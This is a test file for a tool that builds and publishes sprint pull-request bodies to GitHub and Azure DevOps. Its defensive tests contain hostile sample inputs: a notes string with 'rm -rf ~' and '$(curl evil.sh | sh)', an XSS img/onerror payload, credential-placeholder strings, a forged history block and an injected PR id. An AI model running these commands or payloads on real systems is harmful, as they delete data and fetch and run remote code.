import { test, describe } from 'node:test';
import assert from 'node:assert/strict';

import {
    buildSprintPrBody, buildSprintPrTitle, parseRunHistory, sanitizePrMarkdown,
    RUN_HISTORY_MAX_ENTRIES,
} from '../fleet-sprint/pr-body.mjs';
import {
    buildCreatePrCommand, buildFindPrCommand, buildUpdatePrCommand, PR_DESCRIPTION_MAX_LENGTH,
} from '../fleet-sprint/vcs-module.mjs';
import { raiseVcsPrForMember } from '../fleet-sprint/vcs-auth.mjs';
import { runPublishPrPhase } from '../fleet-sprint/phases/publish-pr.mjs';
import { finalizeAbort } from '../fleet-sprint/runner.js';
import { SprintPlanRejectedError } from '../fleet-sprint/errors.mjs';
import { nativeDashDPayload } from './helpers/windows-argv.mjs';

// =============================================================================
// Sprint PR body format + existing-PR rewrite on relaunch.
//
// (1) The reviewer's notes used to be squeezed through a single-line
//     shell-argument sanitizer, so paragraphs and bullet lists reached the
//     PR as one line. The body is now markdown built by pr-body.mjs and must
//     keep its line structure all the way through every provider's command
//     builder, on POSIX and PowerShell members alike.
// (2) A relaunch on a branch that already has a PR used to log "idempotent
//     success" and leave the old verdict in the title/body. It must now find
//     the PR, rewrite title + body for the new run and carry earlier runs
//     forward in the hidden run-history block.
//
// ASCII only.
// =============================================================================

const NOTES = [
    'All acceptance criteria met; two follow-ups noted.',
    '',
    'Verified:',
    '- task A: unit tests green (12/12)',
    '- task B: build passes on all three OSes',
    '',
    'Follow-ups:',
    '1. tighten the retry backoff',
    '2. document the new flag',
    '',
    'Closing paragraph with "quotes", an apostrophe\'s, $HOME and `code`.',
].join('\n');

const NOW = new Date('2026-10-01T09:30:00Z');

const EXPECTED_BODY = [
    '## Sprint verdict: PASS',
    '',
    '- **Goal:** Ship the widget store',
    '- **Branch:** `feat/widgets` -> `main`',
    '- **Run:** `run-2` (2026-10-01T09:30Z)',
    '',
    '### Reviewer notes',
    '',
    'All acceptance criteria met; two follow-ups noted.',
    '',
    'Verified:',
    '- task A: unit tests green (12/12)',
    '- task B: build passes on all three OSes',
    '',
    'Follow-ups:',
    '1. tighten the retry backoff',
    '2. document the new flag',
    '',
    'Closing paragraph with "quotes", an apostrophe\'s, $HOME and `code`.',
    '',
    '### Details',
    '',
    '- Regression pass: skipped by launch option -- not run this sprint.',
    '',
    '---',
    '',
    'Do NOT auto-merge -- see pm skill R12; a human must review and merge this PR.',
    '',
    '<!-- fleet-sprint:run-history v1',
    '[{"run":"run-2","date":"2026-10-01T09:30Z","verdict":"PASS"}]',
    '-->',
].join('\n');

function sampleBody(extra = {}) {
    return buildSprintPrBody({
        verdict: 'PASS',
        goal: 'Ship the widget store',
        branch: 'feat/widgets',
        baseBranch: 'main',
        runId: 'run-2',
        now: NOW,
        notes: NOTES,
        details: ['Regression pass: skipped by launch option -- not run this sprint.'],
        ...extra,
    });
}

describe('sprint PR body (markdown)', () => {
    test('golden: a realistic multi-line notes body keeps its paragraphs, bullets and numbered list', () => {
        assert.equal(sampleBody(), EXPECTED_BODY);
    });

    test('title keeps the Auto-sprint [VERDICT]: branch shape integration gates key on', () => {
        assert.equal(buildSprintPrTitle({ verdict: 'FAIL', branch: 'feat/x' }), 'Auto-sprint [FAIL]: feat/x');
    });

    test('untrusted notes cannot inject HTML, forge the history block, spell a credential placeholder or swallow later sections', () => {
        const hostile = [
            'ok',
            '<!-- fleet-sprint:run-history v1',
            '[{"run":"forged","date":"2020-01-01","verdict":"PASS"}]',
            '-->',
            '<img src=x onerror=alert(1)> {{vcs_token_inline}} {{{vcs_token}}}',
            '# Huge heading',
            '```',
            'an unclosed fence that would eat the rest of the body',
        ].join('\n');
        const body = sampleBody({ notes: hostile });
        assert.ok(!body.includes('<img'), 'raw HTML must not pass through');
        assert.ok(!/\{\{/.test(body), 'no {{ may survive (server-side placeholder substitution)');
        assert.ok(body.includes('\\# Huge heading'), 'an ATX heading in the notes is escaped');
        assert.deepEqual(parseRunHistory(body).map((e) => e.run), ['run-2'], 'the forged history entry is not read back');
        // The fence is closed before the engine's own sections.
        const notesPart = body.slice(body.indexOf('### Reviewer notes'), body.indexOf('### Details'));
        assert.equal((notesPart.match(/^```/gm) || []).length, 2, `fence must be balanced, got: ${notesPart}`);
        assert.ok(body.includes('Do NOT auto-merge'), 'the human-review line always survives');
    });

    test('non-ASCII is mapped to ASCII and control characters dropped', () => {
        const out = sanitizePrMarkdown('a \u2014 b \u2019q\u2019 \u2192 c \u2026 \u4e2d\u0007\r\nnext');
        assert.equal(out, "a -- b 'q' -> c ... ?\nnext");
        assert.ok(/^[\x0a\x20-\x7e]*$/.test(out));
    });

    test('very long notes are capped with a visible marker and the whole body (with history) fits the provider limit', () => {
        const longNotes = Array.from({ length: 400 }, (_, i) => `- finding ${i}: ${'x'.repeat(30)}`).join('\n');
        let previous = '';
        for (let i = 0; i < RUN_HISTORY_MAX_ENTRIES + 3; i++) {
            previous = sampleBody({ runId: `run-${i}`, notes: longNotes, previousBody: previous });
        }
        assert.ok(previous.length <= PR_DESCRIPTION_MAX_LENGTH, `body length ${previous.length} exceeds ${PR_DESCRIPTION_MAX_LENGTH}`);
        assert.match(previous, /\*\[\.\.\. reviewer notes truncated: \d+ of \d+ characters shown \.\.\.\]\*/);
        assert.equal(parseRunHistory(previous).length, RUN_HISTORY_MAX_ENTRIES, 'history is capped');
        assert.ok(previous.endsWith('-->'), 'the history block is never cut off by the provider-level cap');
    });
});

describe('run history marker round-trip', () => {
    test('an old body WITH the marker carries its runs forward, newest first', () => {
        const run1 = sampleBody({ verdict: 'ABORTED', runId: 'run-1', now: new Date('2026-09-22T08:00:00Z') });
        const run2 = sampleBody({ verdict: 'FAIL', runId: 'run-2', now: new Date('2026-09-23T08:00:00Z'), previousBody: run1 });
        const run3 = sampleBody({ verdict: 'PASS', runId: 'run-3', now: NOW, previousBody: run2 });
        assert.deepEqual(parseRunHistory(run3), [
            { run: 'run-3', date: '2026-10-01T09:30Z', verdict: 'PASS' },
            { run: 'run-2', date: '2026-09-23T08:00Z', verdict: 'FAIL' },
            { run: 'run-1', date: '2026-09-22T08:00Z', verdict: 'ABORTED' },
        ]);
        assert.ok(run3.includes('### Previous runs\n\n- `run-2` (2026-09-23T08:00Z): FAIL\n- `run-1` (2026-09-22T08:00Z): ABORTED'));
        assert.ok(run3.startsWith('## Sprint verdict: PASS'));
    });

    test('an old body WITHOUT the marker (pre-format PR) is rewritten cleanly with a fresh history', () => {
        const legacy = 'Automated sprint (goal: x).\n\nFinal Verdict: FAIL\nNotes: one long line';
        const body = sampleBody({ previousBody: legacy });
        assert.equal(body, EXPECTED_BODY);
        assert.ok(!body.includes('Previous runs'));
    });

    test('a CRLF body (saved from a web editor) still carries its history forward', () => {
        const run1 = sampleBody({ verdict: 'FAIL', runId: 'run-1', now: new Date('2026-09-30T08:00:00Z') });
        const crlf = run1.replace(/\n/g, '\r\n');
        assert.ok(crlf.includes('v1\r\n['), 'sanity: the marker lines really are CRLF');
        assert.deepEqual(parseRunHistory(crlf), [{ run: 'run-1', date: '2026-09-30T08:00Z', verdict: 'FAIL' }]);
        const run2 = sampleBody({ runId: 'run-2', previousBody: crlf });
        assert.deepEqual(parseRunHistory(run2).map((e) => e.run), ['run-2', 'run-1']);
    });

    test('a malformed or tampered marker is ignored, never thrown on', () => {
        assert.deepEqual(parseRunHistory('<!-- fleet-sprint:run-history v1\nnot json\n-->'), []);
        assert.deepEqual(parseRunHistory('<!-- fleet-sprint:run-history v1\n{"a":1}\n-->'), []);
        assert.deepEqual(
            parseRunHistory('<!-- fleet-sprint:run-history v1\n[{"run":"ok","date":"2026-01-01","verdict":"MAYBE"},{"run":"r","date":"2026-01-02","verdict":"FAIL"}]\n-->'),
            [{ run: 'r', date: '2026-01-02', verdict: 'FAIL' }],
        );
    });
});

// -----------------------------------------------------------------------------
// Newlines survive the provider command builders end to end.
// -----------------------------------------------------------------------------
function posixDashD(command) {
    const m = /-d '((?:[^']|'\\'')*)' -w/.exec(command);
    assert.ok(m, `no POSIX -d payload in: ${command}`);
    return JSON.parse(m[1].replace(/'\\''/g, "'"));
}

const PROVIDERS = [
    { provider: 'github', coords: { repo: 'acme/widgets' }, bodyField: 'body' },
    { provider: 'azure-devops', coords: { repoRef: { org: 'acme', project: 'proj one', repo: 'widgets' } }, bodyField: 'description' },
];
const TARGETS = [
    { label: 'linux', os: 'linux', shell: '', decode: posixDashD },
    { label: 'windows+gitbash', os: 'windows', shell: 'gitbash', decode: posixDashD },
    { label: 'windows+powershell5', os: 'windows', shell: 'powershell5', decode: (c) => JSON.parse(nativeDashDPayload(c)) },
    { label: 'windows+pwsh7', os: 'windows', shell: 'pwsh7', decode: (c) => JSON.parse(nativeDashDPayload(c)) },
];

describe('the multi-line body reaches the provider byte-for-byte (create + update, every shell)', () => {
    const body = sampleBody();
    for (const p of PROVIDERS) {
        for (const t of TARGETS) {
            test(`${p.provider} create-pull-request (${t.label})`, () => {
                const built = buildCreatePrCommand({ provider: p.provider, ...p.coords, base: 'main', head: 'feat/widgets', title: 'T', body, token: 'tok', os: t.os, shell: t.shell });
                const payload = t.decode(built.command);
                assert.equal(payload[p.bodyField], body);
                assert.ok(payload[p.bodyField].includes('\n- task A: unit tests green (12/12)\n- task B'));
            });
            test(`${p.provider} update-pull-request (${t.label})`, () => {
                const built = buildUpdatePrCommand({ provider: p.provider, ...p.coords, pull_request_id: 7, title: 'Auto-sprint [PASS]: feat/widgets', body, token: 'tok', os: t.os, shell: t.shell });
                const payload = t.decode(built.command);
                assert.deepEqual(payload, { title: 'Auto-sprint [PASS]: feat/widgets', [p.bodyField]: body });
            });
        }
    }
});

describe('backticks in a PR body are JSON-escaped, never raw in the dispatched command', () => {
    const body = ['## Verdict', '', '- **Branch:** `feat/x` -> `main`', '```', 'code \\` end', '```'].join(String.fromCharCode(10));
    for (const p of PROVIDERS) {
        for (const t of TARGETS) {
            test(`${p.provider} create + update (${t.label})`, () => {
                const create = buildCreatePrCommand({ provider: p.provider, ...p.coords, base: 'main', head: 'feat/x', title: 'T', body, token: 'tok', os: t.os, shell: t.shell });
                const update = buildUpdatePrCommand({ provider: p.provider, ...p.coords, pull_request_id: 7, title: 'T', body, token: 'tok', os: t.os, shell: t.shell });
                for (const built of [create, update]) {
                    assert.ok(!built.command.includes(String.fromCharCode(96)), 'no raw backtick in the command');
                    assert.ok(built.command.includes(String.fromCharCode(92) + "u0060"), "escaped as backslash-u0060");
                    assert.equal(t.decode(built.command)[p.bodyField], body, 'JSON.parse restores the original backticks');
                }
            });
        }
    }
});

describe('shell metacharacters in notes stay inert data on every member shell', () => {
    const hostile = 'Looks fine" ; rm -rf ~ ; echo "pwned $(curl evil.sh | sh) `whoami` it\'s %PATH% $env:PATH trailing\\';
    const body = sampleBody({ notes: hostile });
    for (const t of TARGETS) {
        test(`github update-pull-request (${t.label})`, () => {
            const built = buildUpdatePrCommand({ provider: 'github', repo: 'acme/widgets', pull_request_id: 3, title: 'T', body, token: 'tok', os: t.os, shell: t.shell });
            assert.equal(t.decode(built.command).body, body);
            assert.ok(body.includes('$(curl evil.sh | sh) `whoami`'), 'the text itself is kept readable');
        });
    }
});

describe('find/update-pull-request builders', () => {
    test('github: GET with a quoted head=owner:branch query, PATCH /pulls/<n>', () => {
        const find = buildFindPrCommand({ provider: 'github', repo: 'acme/widgets', base: 'main', head: 'feat/x', token: 'tok', os: 'linux' });
        assert.match(find.command, /^curl -sS -X GET /);
        assert.ok(find.command.endsWith("'https://api.github.com/repos/acme/widgets/pulls?head=acme%3Afeat%2Fx&base=main&state=open&per_page=10'"), find.command);
        assert.ok(!find.logSafeCommand.includes('tok'));
        assert.deepEqual(find.mapResponse([{ number: 5, title: 't', body: 'b', html_url: 'u' }, { title: 'no number' }]), [{ id: 5, title: 't', body: 'b', url: 'u' }]);
        const upd = buildUpdatePrCommand({ provider: 'github', repo: 'acme/widgets', pull_request_id: 5, title: 't', body: 'b', token: 'tok', os: 'linux' });
        assert.match(upd.command, /^curl -sS -X PATCH /);
        assert.ok(upd.command.endsWith(' https://api.github.com/repos/acme/widgets/pulls/5'));
        assert.equal(upd.descriptionTruncated, null);
    });

    test('azure-devops: GET with searchCriteria for source/target refs, PATCH pullrequests/<id>', () => {
        const coords = { repoRef: { org: 'acme', project: 'proj one', repo: 'widgets' } };
        const find = buildFindPrCommand({ provider: 'azure-devops', ...coords, base: 'main', head: 'feat/x', token: 'tok', os: 'linux' });
        assert.match(find.command, /^curl -sS -X GET -u ':tok'/);
        assert.ok(find.command.includes("'https://dev.azure.com/acme/proj%20one/_apis/git/repositories/widgets/pullrequests?searchCriteria.sourceRefName=refs%2Fheads%2Ffeat%2Fx&searchCriteria.targetRefName=refs%2Fheads%2Fmain&searchCriteria.status=active&api-version=7.1'"), find.command);
        assert.deepEqual(find.mapResponse({ value: [{ pullRequestId: 9, title: 't', description: 'd' }] }), [
            { id: 9, title: 't', body: 'd', url: 'https://dev.azure.com/acme/proj%20one/_git/widgets/pullrequest/9' },
        ]);
        const upd = buildUpdatePrCommand({ provider: 'azure-devops', ...coords, pull_request_id: 9, title: 't', body: 'x'.repeat(PR_DESCRIPTION_MAX_LENGTH + 5), token: 'tok', os: 'linux' });
        assert.match(upd.command, /^curl -sS -X PATCH /);
        assert.ok(upd.command.endsWith(' https://dev.azure.com/acme/proj%20one/_apis/git/repositories/widgets/pullrequests/9?api-version=7.1'));
        assert.deepEqual(upd.descriptionTruncated, { originalLength: PR_DESCRIPTION_MAX_LENGTH + 5, maxLength: PR_DESCRIPTION_MAX_LENGTH });
    });

    test('a non-numeric PR id is a typed ERROR, and a provider without the builders fails closed', () => {
        assert.throws(() => buildUpdatePrCommand({ provider: 'github', repo: 'a/b', pull_request_id: '5; rm', title: 't', body: 'b', token: 'tok' }), /^Error: ERROR: VCSModule: a numeric "pull_request_id"/);
        assert.throws(() => buildFindPrCommand({ provider: 'bitbucket', repo: 'a/b', base: 'main', head: 'x', token: 'tok' }), /does not yet implement action "find-pull-request"/);
    });
});

// -----------------------------------------------------------------------------
// Existing-PR path: a fake GitHub behind vcs_credential_exec.
// -----------------------------------------------------------------------------
function fakeGitHub({ existing = null, failUpdateOnce = 0 } = {}) {
    const state = { pr: existing ? { number: 42, ...existing } : null, calls: [], failUpdate: failUpdateOnce };
    const respond = (status, body) => ({ content: [{ text: '' }], structuredContent: { ok: true, reason: 'ok', exitCode: 0, stdout: `${JSON.stringify(body)}\n${status}`, stderr: '' } });
    state.exec = (cmd) => {
        const method = /^curl -sS -X (\w+)/.exec(cmd)[1];
        state.calls.push(method);
        if (method === 'POST') {
            const p = posixDashD(cmd);
            if (state.pr) return respond(422, { message: 'Validation Failed', errors: [{ message: 'A pull request already exists for acme:feat/x.' }] });
            state.pr = { number: 42, title: p.title, body: p.body };
            return respond(201, { number: 42, html_url: 'https://github.com/acme/widgets/pull/42' });
        }
        if (method === 'GET') {
            const list = state.pr ? [{ number: state.pr.number, title: state.pr.title, body: state.pr.body, html_url: 'https://github.com/acme/widgets/pull/42' }] : [];
            return respond(200, list);
        }
        if (method === 'PATCH') {
            if (state.failUpdate > 0) {
                state.failUpdate -= 1;
                return respond(401, { message: 'Bad credentials' });
            }
            const p = posixDashD(cmd);
            state.pr = { ...state.pr, title: p.title, body: p.body };
            return respond(200, { number: 42, html_url: 'https://github.com/acme/widgets/pull/42' });
        }
        throw new Error(`unexpected method ${method}`);
    };
    state.callTool = async (name, toolArgs) => {
        if (name === 'member_detail') return { content: [{ text: JSON.stringify({ vcsProvider: 'github', os: 'linux', shell: '' }) }] };
        if (name === 'provision_vcs_auth') return { content: [{ text: 'ok' }], structuredContent: { ok: true, expiresAt: null } };
        if (name === 'credential_store_list') return { content: [{ text: '[]' }] };
        if (name === 'vcs_credential_exec') return state.exec(toolArgs.command);
        throw new Error(`unexpected tool ${name}`);
    };
    return state;
}

const remoteCommand = async (cmd) => (cmd === 'git remote get-url origin'
    ? { ok: true, output: 'https://github.com/acme/widgets.git', error: null }
    : { ok: true, output: '', error: null });

async function publish({ gh, verdict, notes, runId, member }) {
    const logs = [];
    const result = await runPublishPrPhase({
        phase: () => {},
        log: (m) => logs.push(m),
        command: remoteCommand,
        args: { callTool: gh.callTool, run_id: runId },
        validated: { branch: 'feat/x', baseBranch: 'main', goal: 'Ship X', runId },
        targetIssues: [],
        backlogMember: member,
        finalCycleLabel: '1',
        gitSync: { pushGitAfter: async () => {}, syncBeadsAfter: async () => {} },
        getMemberForRole: () => member,
        finalVerdictResult: { verdict, notes },
    });
    return { result, logs };
}

describe('Publish PR: a relaunch rewrites the existing PR for the new verdict', () => {
    test('FAIL -> PASS: title and body updated, the FAIL run kept under Previous runs', async () => {
        const gh = fakeGitHub();
        await publish({ gh, verdict: 'FAIL', notes: 'Gate failed:\n- bead 1 open', runId: 'run-1', member: 'pub-fail-pass' });
        assert.equal(gh.pr.title, 'Auto-sprint [FAIL]: feat/x');
        const { logs } = await publish({ gh, verdict: 'PASS', notes: 'All good.\n- verified', runId: 'run-2', member: 'pub-fail-pass' });
        assert.deepEqual(gh.calls, ['POST', 'POST', 'GET', 'PATCH']);
        assert.equal(gh.pr.title, 'Auto-sprint [PASS]: feat/x');
        assert.ok(gh.pr.body.startsWith('## Sprint verdict: PASS'));
        assert.ok(gh.pr.body.includes('All good.\n- verified'));
        assert.ok(!gh.pr.body.includes('bead 1 open'), 'the old run\'s notes are replaced, not appended');
        assert.deepEqual(parseRunHistory(gh.pr.body).map((e) => `${e.run}:${e.verdict}`), ['run-2:PASS', 'run-1:FAIL']);
        assert.ok(logs.some((m) => m.includes('already exists') && m.includes('updated its title and body') && m.includes('(PASS)')), JSON.stringify(logs));
    });

    test('PASS -> FAIL: the stale PASS title is replaced too', async () => {
        const gh = fakeGitHub();
        await publish({ gh, verdict: 'PASS', notes: 'fine', runId: 'run-a', member: 'pub-pass-fail' });
        await publish({ gh, verdict: 'FAIL', notes: 'regressed', runId: 'run-b', member: 'pub-pass-fail' });
        assert.equal(gh.pr.title, 'Auto-sprint [FAIL]: feat/x');
        assert.ok(gh.pr.body.startsWith('## Sprint verdict: FAIL'));
        assert.deepEqual(parseRunHistory(gh.pr.body).map((e) => e.verdict), ['FAIL', 'PASS']);
    });

    test('a pre-format PR (no history marker) is rewritten cleanly with fresh history', async () => {
        const gh = fakeGitHub({ existing: { title: 'Auto-sprint [ABORTED]: feat/x', body: 'Automated sprint ABORTED.\n\nError code: X' } });
        await publish({ gh, verdict: 'PASS', notes: 'ok', runId: 'run-9', member: 'pub-legacy' });
        assert.equal(gh.pr.title, 'Auto-sprint [PASS]: feat/x');
        assert.deepEqual(parseRunHistory(gh.pr.body).map((e) => e.run), ['run-9']);
        assert.ok(!gh.pr.body.includes('Previous runs'));
    });

    test('an update that fails twice with auth errors self-heals once then degrades loudly (WARNING), never throws', async () => {
        const gh = fakeGitHub({ existing: { title: 'Auto-sprint [FAIL]: feat/x', body: '' }, failUpdateOnce: 2 });
        const { result, logs } = await publish({ gh, verdict: 'PASS', notes: 'ok', runId: 'run-3', member: 'pub-auth' });
        assert.deepEqual(result, { pushed: true });
        assert.deepEqual(gh.calls, ['POST', 'GET', 'PATCH', 'PATCH']);
        assert.equal(gh.pr.title, 'Auto-sprint [FAIL]: feat/x', 'the PR is left as it was');
        assert.ok(logs.some((m) => m.includes('auth-classified failure') && m.includes('update-pull-request')), JSON.stringify(logs));
        assert.ok(logs.some((m) => m.includes('WARNING') && m.includes('could NOT be updated') && m.includes('HTTP 401')), JSON.stringify(logs));
    });

    test('a single auth failure on the update self-heals and the retry lands', async () => {
        const gh = fakeGitHub({ existing: { title: 'Auto-sprint [FAIL]: feat/x', body: '' }, failUpdateOnce: 1 });
        await publish({ gh, verdict: 'PASS', notes: 'ok', runId: 'run-4', member: 'pub-auth-heal' });
        assert.deepEqual(gh.calls, ['POST', 'GET', 'PATCH', 'PATCH']);
        assert.equal(gh.pr.title, 'Auto-sprint [PASS]: feat/x');
    });
});

// The [ABORTED] PR path (finalizeAbort) shares the same update hook.
function abortCommand() {
    return async (cmd, opts = {}) => {
        const out = (output) => (opts.failSoft ? { ok: true, output, error: null } : output);
        if (/^git fetch origin\b/.test(cmd)) return out('');
        if (/^git rev-list --count\b/.test(cmd)) return out('2');
        if (/^git push\b/.test(cmd)) return out('To mock-remote');
        if (/^git remote get-url origin\b/.test(cmd)) return out('https://github.com/acme/widgets.git');
        throw new Error(`abortCommand: unexpected command '${cmd}'`);
    };
}

async function abortRun({ gh, member }) {
    const logs = [];
    const result = await finalizeAbort({
        error: new SprintPlanRejectedError('Plan rejected after 3 rounds', { notes: null }),
        branch: 'feat/x', baseBranch: 'main', member, command: abortCommand(),
        log: (m) => logs.push(m), callTool: gh.callTool, runId: 'run-abort',
    });
    return { result, logs };
}

describe('finalizeAbort: an abort on a branch with an existing PR rewrites it as ABORTED', () => {
    test('PASS -> ABORTED: title and body updated, the PASS run kept in history', async () => {
        const gh = fakeGitHub();
        await publish({ gh, verdict: 'PASS', notes: 'fine', runId: 'run-ok', member: 'abort-upd' });
        const { result, logs } = await abortRun({ gh, member: 'abort-upd' });
        assert.equal(result.reason, 'already-exists');
        assert.deepEqual(gh.calls, ['POST', 'POST', 'GET', 'PATCH']);
        assert.equal(gh.pr.title, 'Auto-sprint [ABORTED]: feat/x');
        assert.ok(gh.pr.body.startsWith('## Sprint verdict: ABORTED'));
        assert.ok(gh.pr.body.includes('### Abort details') && gh.pr.body.includes('- Error code: SPRINT_PLAN_REJECTED'));
        assert.deepEqual(parseRunHistory(gh.pr.body).map((e) => `${e.run}:${e.verdict}`), ['run-abort:ABORTED', 'run-ok:PASS']);
        assert.ok(logs.some((m) => m.includes('updated the existing PR') && m.includes('(ABORTED)')), JSON.stringify(logs));
    });

    test('an update failure logs a WARNING, leaves the PR as it was and never throws', async () => {
        const gh = fakeGitHub({ existing: { title: 'Auto-sprint [PASS]: feat/x', body: 'old' } });
        const origExec = gh.exec;
        gh.exec = (cmd) => (/-X PATCH/.test(cmd)
            ? { content: [{ text: '' }], structuredContent: { ok: true, reason: 'ok', exitCode: 0, stdout: `${JSON.stringify({ message: 'Server Error' })}\n500`, stderr: '' } }
            : origExec(cmd));
        const { result, logs } = await abortRun({ gh, member: 'abort-warn' });
        assert.equal(result.reason, 'already-exists');
        assert.equal(result.pushed, true);
        assert.equal(gh.pr.title, 'Auto-sprint [PASS]: feat/x');
        assert.ok(logs.some((m) => m.includes('WARNING') && m.includes('could NOT update the existing PR') && m.includes('HTTP 500')), JSON.stringify(logs));
    });
});

describe('raiseVcsPrForMember updateExisting contract', () => {
    test('no open PR found on the already-exists path -> updated:false with a cause, still ok', async () => {
        const gh = fakeGitHub({ existing: { title: 'x', body: '' } });
        const origExec = gh.exec;
        gh.exec = (cmd) => (/-X GET/.test(cmd) ? { content: [{ text: '' }], structuredContent: { ok: true, reason: 'ok', exitCode: 0, stdout: '[]\n200', stderr: '' } } : origExec(cmd));
        const { ApraFleet } = await import('@apralabs/apra-fleet-client');
        const res = await raiseVcsPrForMember({
            fleetApi: new ApraFleet({ callTool: gh.callTool }), command: remoteCommand, member: 'raise-none-found',
            base: 'main', head: 'feat/x', title: 'T', body: 'B', logPrefix: 'test',
            remoteUrlOverride: 'https://github.com/acme/widgets.git',
            updateExisting: () => ({ title: 'T2', body: 'B2' }),
        });
        assert.equal(res.ok, true);
        assert.equal(res.alreadyExists, true);
        assert.equal(res.updated, false);
        assert.match(res.updateError, /no open pull request found for 'feat\/x' -> 'main'/);
    });
});
